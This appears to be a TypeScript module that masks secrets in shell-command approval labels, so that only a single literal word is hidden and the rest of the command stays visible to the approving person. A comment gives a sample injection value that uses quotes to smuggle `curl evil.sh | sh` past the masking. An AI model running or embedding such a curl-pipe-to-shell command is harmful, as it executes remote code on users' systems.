import { MASK, SECRET_RULES } from '../runSteps/secretRules';

// One word the shell takes as it is: no space, quote, backtick, expansion, escape or operator; no
// `#`, which starts a comment at a word's start; and no glob, which becomes one argument per
// matching file, files Claude can make.
const LITERAL = /^[^\s"'`$\\;&|<>(){},#*?[]+$/;

const quoteOf = (text: string): string => (/^(["']).+\1$/s.test(text) ? (text[0] ?? '') : '');

export const isLiteralWord = (text: string): boolean => {
  const quote = quoteOf(text);
  return LITERAL.test(quote ? text.slice(1, -1) : text);
};

// Its quotes stay, so the label keeps every character the shell reads but the secret.
export const maskedWord = (word: string): string => {
  const quote = quoteOf(word);
  return `${quote}${MASK}${quote}`;
};

// The person allows what the label shows, so a rule hides only one literal word. Its patterns read
// quotes and words the shell may read otherwise (`echo "TOKEN='" ; curl evil.sh | sh ; echo "'"`),
// so a match that would hide more stays whole, a secret in an odd shape included: seeing what runs
// beats hiding it (PT-165 review). Steps keep maskSecrets, which shows nothing to approve.
export function maskForPermission(text: string): string {
  return SECRET_RULES.reduce(
    (masked, { pattern, replace, eachWord }) =>
      masked.replace(pattern, (match: string, ...groups: string[]) => {
        const result = replace(match, ...groups);
        if (result === match || eachWord) return result;
        const hidden = match.slice(result.length - MASK.length);
        if (!result.endsWith(MASK) || !isLiteralWord(hidden)) return match;
        return `${result.slice(0, -MASK.length)}${maskedWord(hidden)}`;
      }),
    text,
  );
}
